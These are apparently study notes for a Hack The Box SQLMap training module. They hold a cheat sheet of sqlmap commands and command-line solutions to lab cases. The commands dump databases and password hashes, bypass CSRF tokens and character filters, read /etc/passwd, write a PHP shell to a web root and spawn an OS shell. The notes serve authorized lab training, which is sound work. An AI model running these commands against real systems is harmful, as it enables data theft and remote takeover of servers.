# SQLMAP Essentials  

| **Command** | **Description** |
| ----------- | ----------- |
| `sqlmap -h` | View the basic help menu |
| `sqlmap -hh` | View the advanced help menu [Getting Started with SQLMap](https://academy.hackthebox.com/module/58/section/694) |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch` | Run `SQLMap` without asking for user input using the `batch` switch. |
| `sqlmap output logging information definitions` | [SQLMap Output Description](https://academy.hackthebox.com/module/58/section/696) |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'` | `SQLMap` with POST request |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'` | POST request specifying an injection point with an asterisk |
| `sqlmap -r req.txt` | Passing an HTTP request file to `SQLMap` [To run SQLMap with an HTTP request file, we use the -r flag, as follows:](https://academy.hackthebox.com/module/58/section/517) |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'` | Specifying a cookie header |
| `sqlmap -u www.target.com --data='id=1' --method PUT` | Specifying a PUT request |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt` | Store traffic to an output file [Handling SQLMap Errors](https://academy.hackthebox.com/module/58/section/695) |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch` | Specify verbosity level |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"` | Specifying a prefix or suffix [Attack Tuning](https://academy.hackthebox.com/module/58/section/526) |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5` | Specifying the level and risk |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba` | Basic DB enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb` | Table enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname` | Table/row enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` | Conditional enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --schema` | Database schema enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user` | Searching for data |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch` | Password enumeration and cracking |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass [Anti-CSRF Token Bypass switch](https://academy.hackthebox.com/module/58/section/530) |
| `sqlmap --list-tampers` | List all tamper scripts |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba` | Check for DBA privileges |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"` | Reading a local file |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Writing a file |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell` | Spawning an OS shell |

# Exercise Cases  

>[Questions SQLMAP](https://academy.hackthebox.com/module/58/section/517)  
  
>What's the contents of table `flag2` ? (Case #2) 
>Detect and exploit SQLi vulnerability in POST parameter `id`

```
sqlmap -r case2.req --batch -p 'id' --flush-session --level=5 --risk=3
```  

```
sqlmap -r case2.req --batch -p 'id' --level=5 --risk=3 --dbms MySQL --dbs
```  

```
sqlmap -r case2.req --batch -p 'id' --level=5 --risk=3 --dbms MySQL -D testdb -T flag2 --dump
```  

>What's the contents of table flag3? (Case #3)  
>Detect and exploit SQLi vulnerability in Cookie value `id=1`

```
sqlmap -r case3.req --batch -p 'id' --cookie="id=1" --level=5 --risk=3 --flush-session
```

```
sqlmap -r case3.req --batch -p 'id' --cookie="id=1" --level=5 --risk=3 --dbms MySQL --dbs
```  

```
sqlmap -r case3.req --batch -p 'id' --cookie="id=1" --level=5 --risk=3 --dbms MySQL -D testdb -T flag3 --dump
```  

>What's the contents of table flag4? (Case #4)
>Detect and exploit SQLi vulnerability in JSON data {"id": 1}

![sqlmap-json](/images/sqlmap-json.png)  

```
sqlmap -r case4.req --batch -p 'id' --level=5 --risk=3 --flush-session
```

```
sqlmap -r case4.req --batch -p 'id' --level=5 --risk=3 -dbms MySQL --dbs
```  

```
sqlmap -r case4.req --batch -p 'id' --level=5 --risk=3 -dbms MySQL -D testdb -T flag4 --dump
```

>[Questions SQLMAP - Attack Tuning](https://academy.hackthebox.com/module/58/section/526)  

>What's the contents of table flag5? (Case #5)
>Detect and exploit (OR) SQLi vulnerability in GET parameter id  

```
sqlmap -r case5.req --batch -p 'id' --level=5 --risk=3 -dbms MySQL --dbs --flush-session
```

```
sqlmap -r case5.req --batch -p 'id' --level=5 --risk=3 -dbms MySQL -D testdb -T flag5 --dump 
```  

>What's the contents of table flag6? (Case #6)
>Detect and exploit SQLi vulnerability in GET parameter `col` having non-standard boundaries
>Test if the back tick cause and SQL query syntax error, successful enumerated.

```
sqlmap -r case6.req --batch -p 'col' --level=5 --risk=3 --prefix='`)' -D testdb -T flag6 --dump --flush-session
```

>What's the contents of table flag7? (Case #7)
>Detect and exploit SQLi vulnerability in GET parameter id by usage of UNION query-based technique  
>Without the --no-cast option sqlmap can't retrieve the tables. With the --no-cast option sqlmap can retrieve the tables but not the columns. With the --no-cast option sqlmap can retrieve the tables but not the columns.

```
sqlmap -r case7.req --batch -dbms MySQL --union-cols=5 -D testdb -T flag7 --dump --no-cast --flush-session
```  

>[Question - Database Enumeration](https://academy.hackthebox.com/module/58/section/510)  

>What's the contents of table `flag1` in the `testdb` database? (Case #1)
>Detect and exploit SQLi vulnerability in GET parameter id

```
sqlmap -r case1.req --batch -p 'id' -dbms MySQL -D testdb -T flag1 --dump
```  

>[Questions - Advanced Database Enumeration](https://academy.hackthebox.com/module/58/section/529)  

>What's the name of the column containing "style" in it's name? (Case #1)

```
sqlmap -r case1.req --batch -p 'id' --search -C "style"
```  

>What's the Kimberly user's password? (Case #1)  

```
sqlmap -r case1.req --batch -p 'id' -dbms MySQL -D testdb -T users --columns -C name,password --dump --no-cast
```  

![sqlmap-columns](/images/sqlmap-columns.png)  

>[Question - Bypassing Web Application Protections](https://academy.hackthebox.com/module/58/section/530)  

>What's the contents of table flag8? (Case #8)
>Detect and exploit SQLi vulnerability in POST parameter id, while taking care of the anti-CSRF protection (Note: non-standard token name is used)

![sqlmap-csrf-token-bypass](/IMAGES/sqlmap-csrf-token-bypass.png)  

```
sqlmap -r case8.req --batch -p "id" --csrf-token="t0ken" -dbms MySQL -D testdb -T flag8 --dump --flush-session --no-cast
```  

>What's the contents of table flag9? (Case #9)
>Detect and exploit SQLi vulnerability in GET parameter id, while taking care of the unique `uid` random values.  

![sqlmap-unique-parameter-uid](/images/sqlmap-unique-parameter-uid.png)  

```
sqlmap -r case9.req --batch -p "id" --randomize="uid" -dbms MySQL -D testdb -T flag9 --dump --flush-session --no-cast
```  

>What's the contents of table flag10? (Case #10)
>Primitive protection - Detect and exploit SQLi vulnerability in POST parameter id

```
sqlmap -r case10.req --batch -p "id" --random-agent -dbms MySQL -D testdb -T flag10 --dump --flush-session --no-cast
```  

>What's the contents of table flag11? (Case #11)
>Case11 - Filtering of characters ```'<', '>'```
>Detect and exploit SQLi vulnerability in GET parameter `id`, bypass using [Tamper Scripts](https://academy.hackthebox.com/module/58/section/530).  

```
sqlmap -r case11.req --batch -p "id" --tamper=between -dbms MySQL -D testdb -T flag11 --dump --flush-session --no-cast
```  

>The most popular tamper scripts `between` is replacing all occurrences of greater than operator `(>)` with NOT BETWEEN 0 AND #, and the equals operator `(=)` with BETWEEN # AND #.
>This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes.  

>Burp Suite Certified Professional [Study notes on SQLMAP](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#sqlmap)  
  
>[Questions - OS Exploitation](https://academy.hackthebox.com/module/58/section/697)  

> Try to use SQLMap to read the file `/var/www/html/flag.txt`.  
>Use SQLi vulnerability in GET parameter `id` to exploit the host OS.
>First check if is DBA permissions?  

```
sqlmap -r os-exploit.req --batch -p "id" --is-dba --flush-session
```  

>DBA = true. Read flag File on OS.  

```
sqlmap -r os-exploit.req --batch -p "id" --dbms MySQL --file-read="/var/www/html/flag.txt"

cat /home/kali/.local/share/sqlmap/output/83.136.248.28/files/_var_www_html_flag.txt
```  

>Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.

```
sqlmap -r os-exploit.req --batch -p "id" --os-shell
```

## Skills Assessment  

>[SQLMAP Skills Assessment](https://academy.hackthebox.com/module/58/section/534)  

>You are given access to a web application with basic protection mechanisms.
>Use the skills learned in this module to find the SQLi vulnerability with SQLMap and exploit it accordingly. 
>To complete this module, find the flag and submit it here.  

```

```  


